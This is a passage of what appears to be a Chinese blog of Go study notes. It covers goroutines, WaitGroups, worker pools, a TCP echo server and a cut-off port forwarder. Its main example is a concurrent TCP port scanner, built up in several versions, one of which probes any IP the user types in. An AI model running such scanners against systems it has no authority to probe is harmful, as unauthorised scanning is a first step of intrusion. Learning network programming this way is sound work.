class="hljs-string">&quot;类型是%T&quot;</span>, dirinfo)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(dirinfo); i++ &#123;<br>fmt.Printf(<span class="hljs-string">&quot;第%d项是%s,是否是目录%t\n&quot;</span>, i, dirinfo[i].Name(), dirinfo[i].IsDir())<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">第1项是.user.ini,是否是目录false</span><br><span class="hljs-comment">第2项是0.jpg,是否是目录false</span><br><span class="hljs-comment">第3项是1.bat,是否是目录false</span><br><span class="hljs-comment">第4项是1.jpg,是否是目录false</span><br><span class="hljs-comment">第5项是1.php,是否是目录false</span><br><span class="hljs-comment">第6项是ed8a8619567921e6744dc49adc0c4f75.png,是否是目录false</span><br><span class="hljs-comment">第7项是info.php,是否是目录false</span><br><span class="hljs-comment">第8项是pass.jpg,是否是目录false</span><br><span class="hljs-comment">第9项是test.txt,是否是目录false</span><br><span class="hljs-comment">第10项是whoami.php,是否是目录false</span><br><span class="hljs-comment">*/</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="并发并行"><a href="#并发并行" class="headerlink" title="并发并行"></a>并发并行</h2><ul><li><p>并发性是多个任务交替执行，共享计算资源，提高吞吐量和响应性。</p></li><li><p>并行性是多个任务同时在不同的处理器上执行，提高计算速度和性能。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230808221757.png"></p><h3 id="进程线程携程"><a href="#进程线程携程" class="headerlink" title="进程线程携程"></a>进程线程携程</h3><p>进程是正在运行的程序</p><p>操作系统以进程为单位,进程以线程为单位,一个进程可能包含多个线程</p><p>比如打开word文档,word文档是正在运行的一个进程</p><p>在word里随便敲一行字,会自动触发开头首字母是否大写和整段话是否有拼写错误的检查,这是两个线程</p><p>携程是轻线程</p><h3 id="goroutine"><a href="#goroutine" class="headerlink" title="goroutine"></a>goroutine</h3><p>携程,封装main函数的是主goroutine</p><p>用<code>go</code>标识要用的函数,函数不能有返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">go</span> print_num()<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">101</span>; j &lt; <span class="hljs-number">200</span>; j++ &#123;<br>fmt.Println(j)<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">print_num</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100</span>; i++ &#123;<br>fmt.Printf(<span class="hljs-string">&quot;这是第%d个子线程,i&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-comment">//结果会是交替打印,如果没交替就多打印几次</span><br><span class="hljs-comment">//可能子线程没打印完,但主线程打印完了,那么子线程不会再继续</span><br><br></code></pre></td></tr></table></figure><h2 id="net"><a href="#net" class="headerlink" title="net"></a>net</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs scanme.nmap.org```是nmap提供的免费的可供扫描的网站"><br>### 扫描器<br><br>#### 端口<br><br>```go<br>package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;net&quot;<br>)<br><br>func main() &#123;<br>for i := 1; i &lt;= 1024; i++ &#123;<br>go func(j int) &#123;<br>addr := fmt.Sprintf(&quot;127.0.0.1:%d&quot;, j)<br>con, err := net.Dial(&quot;tcp&quot;, addr)<br>if err != nil &#123;<br>return<br>&#125;<br>con.Close()<br>fmt.Println(j, &quot;端口是打开的&quot;)<br>&#125;(i)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="稍微进阶一点"><a href="#稍微进阶一点" class="headerlink" title="稍微进阶一点"></a>稍微进阶一点</h4><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230809214306.png"></p><p>就是用了goroutine之后,可能有些携程没加载完,但主进程已经加载完了,这个的作用就是每一次循环就记一次数,循环完成之后记的数就是总的携程数,在用wait()函数等待所有携程完成,在结束进程</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 创建一个 sync.WaitGroup 实例，用于等待所有的 goroutines 完成</span><br><span class="hljs-keyword">var</span> ab sync.WaitGroup<br><br><span class="hljs-comment">// 使用循环，遍历从 0 到 1024 的端口号</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1025</span>; i++ &#123;<br><span class="hljs-comment">// 增加等待计数，表示有一个新的 goroutine 需要等待</span><br>ab.Add(<span class="hljs-number">1</span>)<br><br><span class="hljs-comment">// 使用 go 关键字开启一个新的 goroutine</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(j <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-comment">// 在 goroutine 完成时减少等待计数</span><br><span class="hljs-keyword">defer</span> ab.Done()<br><br><span class="hljs-comment">// 构造待扫描的 IP 地址和端口号字符串</span><br>addr := fmt.Sprintf(<span class="hljs-string">&quot;127.0.0.1:%d&quot;</span>, j)<br><br><span class="hljs-comment">// 尝试通过 TCP 协议连接到指定地址</span><br>con, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, addr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-comment">// 如果连接失败，表示端口是关闭的，函数直接返回</span><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-comment">// 连接成功，关闭连接</span><br>con.Close()<br><br><span class="hljs-comment">// 输出端口号是开放的信息</span><br>fmt.Printf(<span class="hljs-string">&quot;%d is open\n&quot;</span>, j)<br>&#125;(i) <span class="hljs-comment">// 传递端口号 i 给匿名函数的参数 j</span><br>&#125;<br><br><span class="hljs-comment">// 等待所有的 goroutines 完成</span><br>ab.Wait()<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(ports <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>,wg *sync.WaitGroup)</span></span>&#123;<br><span class="hljs-keyword">for</span> p:=<span class="hljs-keyword">range</span> ports&#123;<br>fmt.Println(p)<br>wg.Done()<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ports:=<span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>,<span class="hljs-number">100</span>)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><span class="hljs-keyword">for</span> i:=<span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">cap</span>(ports);i++&#123;<br>wg.Add(<span class="hljs-number">1</span>)<br>ports&lt;-i<br>&#125;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ports)<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230810114004.png"><br><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230810115127.png"></p><h4 id="等待组初步"><a href="#等待组初步" class="headerlink" title="等待组初步"></a>等待组初步</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">pro</span><span class="hljs-params">(i <span class="hljs-type">int</span>, wg *sync.WaitGroup)</span></span> &#123;<br>fmt.Printf(<span class="hljs-string">&quot;进程%d开始\n&quot;</span>, i)<br>time.Sleep(<span class="hljs-number">2</span> * time.Second)<br>fmt.Printf(<span class="hljs-string">&quot;进程%d结束\n&quot;</span>, i)<br>wg.Done()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>cou := <span class="hljs-number">3</span><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; cou; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> pro(i, &amp;wg)<br>&#125;<br>wg.Wait()<br>fmt.Println(<span class="hljs-string">&quot;main stop&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="工人池"><a href="#工人池" class="headerlink" title="工人池"></a>工人池</h4><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230810165053.png"></p><h4 id="一个理论上能用的扫描器"><a href="#一个理论上能用的扫描器" class="headerlink" title="一个理论上能用的扫描器"></a>一个理论上能用的扫描器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;sort&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ports := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">100</span>)<br>results := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br><span class="hljs-keyword">var</span> openports []<span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">cap</span>(ports); i++ &#123;<br><span class="hljs-keyword">go</span> worker(ports, results)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">1024</span>; i++ &#123;<br>ports &lt;- i<br>&#125;<br>&#125;()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1024</span>; i++ &#123;<br>port := &lt;-results<br><span class="hljs-keyword">if</span> port != <span class="hljs-number">0</span> &#123;<br>openports = <span class="hljs-built_in">append</span>(openports, port)<br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(ports)<br><span class="hljs-built_in">close</span>(results)<br>sort.Ints(openports)<br><span class="hljs-keyword">for</span> _, port := <span class="hljs-keyword">range</span> openports &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d is open\n&quot;</span>, port)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(ports, results <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> p := <span class="hljs-keyword">range</span> ports &#123;<br>addr := fmt.Sprintf(<span class="hljs-string">&quot;127.0.0.1:%d&quot;</span>, p)<br><span class="hljs-comment">//返回值是一个结构体+一个错误,后面的conn.Close()是结构体.方法的类型</span><br>conn, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, addr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>results &lt;- <span class="hljs-number">0</span><br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-comment">//这里的close是关闭与端口的连接,而不是关闭一个通道</span><br>conn.Close()<br>results &lt;- p<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="年轻人的第一款自制扫描器"><a href="#年轻人的第一款自制扫描器" class="headerlink" title="年轻人的第一款自制扫描器"></a>年轻人的第一款自制扫描器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;sort&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Print(<span class="hljs-string">&quot;请输入要扫描的IP地址: &quot;</span>)<br><span class="hljs-keyword">var</span> ip <span class="hljs-type">string</span><br>fmt.Scanln(&amp;ip)<br>fmt.Println(<span class="hljs-string">&quot;给你一点加载时间,你才知道是真的扫描而不是面向结果编程&quot;</span>)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>ops := []<span class="hljs-type">int</span>&#123;&#125;<br>ports := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">5000</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5000</span>; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(j <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done() <span class="hljs-comment">//这句一定要放前面,确保被程序看到但是推迟了,如果放最后,return之后会直接看不见done</span><br>addr := fmt.Sprintf(<span class="hljs-string">&quot;%s:%d&quot;</span>, ip, j)<br>conn, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, addr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>ports &lt;- j<br>conn.Close()<br><br>&#125;(i)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;正在检测&quot;</span>)<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ports)<br><span class="hljs-keyword">for</span> v := <span class="hljs-keyword">range</span> ports &#123;<br>ops = <span class="hljs-built_in">append</span>(ops, v)<br>&#125;<br>sort.Ints(ops)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> ops &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d port is open\n&quot;</span>, v)<br>&#125;<br>fmt.Println(<span class="hljs-string">&quot;按下回车键以退出程序...&quot;</span>)<br>fmt.Scanln()<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="worker-pool的实现"><a href="#worker-pool的实现" class="headerlink" title="worker pool的实现"></a>worker pool的实现</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br><span class="hljs-string">&quot;sort&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(ports_chan, results_chan <span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)</span></span> &#123;<br><span class="hljs-keyword">for</span> port := <span class="hljs-keyword">range</span> ports_chan &#123;<br><span class="hljs-comment">//这里必须加一个addr来表示端口,下面的net.Dial()需要tcp和ip两个变量,直接 con, err := net.Dial(&quot;tcp&quot;,&quot;:%d&quot;,port)会报错</span><br>addr := fmt.Sprintf(<span class="hljs-string">&quot;:%d&quot;</span>, port)<br>con, err := net.Dial(<span class="hljs-string">&quot;tcp&quot;</span>, addr)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>results_chan &lt;- <span class="hljs-number">0</span><br><span class="hljs-keyword">continue</span><br>&#125;<br>results_chan &lt;- port<br>con.Close()<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>ports_chan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-number">5000</span>)<br>results_chan := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>open_ports := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">30</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-built_in">cap</span>(ports_chan); i++ &#123;<br><span class="hljs-keyword">go</span> worker(ports_chan, results_chan)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5000</span>; i++ &#123;<br>ports_chan &lt;- i<br>&#125;<br>&#125;()<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for port := range results_chan &#123;</span><br><span class="hljs-comment">if port != 0 &#123;</span><br><span class="hljs-comment">open_ports = append(open_ports, port)</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">5000</span>; i++ &#123;<br>port := &lt;-results_chan<br><span class="hljs-keyword">if</span> port != <span class="hljs-number">0</span> &#123;<br>open_ports = <span class="hljs-built_in">append</span>(open_ports, port)<br>&#125;<br>&#125;<br><span class="hljs-built_in">close</span>(ports_chan)<br><span class="hljs-built_in">close</span>(results_chan)<br>sort.Ints(open_ports)<br><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> open_ports &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d port is open\n&quot;</span>, p)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="tcp代理"><a href="#tcp代理" class="headerlink" title="tcp代理"></a>tcp代理</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>listener, err := net.Listen(<span class="hljs-string">&quot;tcp&quot;</span>, <span class="hljs-string">&quot;:20080&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(<span class="hljs-string">&quot;绑不了端口&quot;</span>)<br>&#125;<br>log.Println(<span class="hljs-string">&quot;监听端口20080&quot;</span>)<br><span class="hljs-keyword">for</span> &#123;<br>c, err := listener.Accept()<br>log.Println(<span class="hljs-string">&quot;接收连接&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(<span class="hljs-string">&quot;连不上&quot;</span>)<br>&#125;<br><span class="hljs-keyword">go</span> echo(c)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">echo</span><span class="hljs-params">(c net.Conn)</span></span> &#123;<br><span class="hljs-keyword">defer</span> c.Close()<br>b := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, <span class="hljs-number">512</span>)<br><span class="hljs-keyword">for</span> &#123;<br>size, err := c.Read(b[<span class="hljs-number">0</span>:])<br><span class="hljs-keyword">if</span> err == io.EOF &#123;<br>log.Println(<span class="hljs-string">&quot;未知错误&quot;</span>)<br><span class="hljs-keyword">break</span><br>&#125;<br>log.Printf(<span class="hljs-string">&quot;接收到了%d byte的数据,数据是:%s\n&quot;</span>, size, <span class="hljs-type">string</span>(b))<br>log.Println(<span class="hljs-string">&quot;写数据&quot;</span>)<br><span class="hljs-keyword">if</span> _, err := c.Write(b[<span class="hljs-number">0</span>:size]); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(<span class="hljs-string">&quot;写不了&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="缓冲"><a href="#缓冲" class="headerlink" title="缓冲"></a>缓冲</h3><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230811000713.png"></p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20230811103759.png"></p><h3 id="端口转发器"><a href="#端口转发器" class="headerlink" title="端口转发器"></a>端口转发器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span 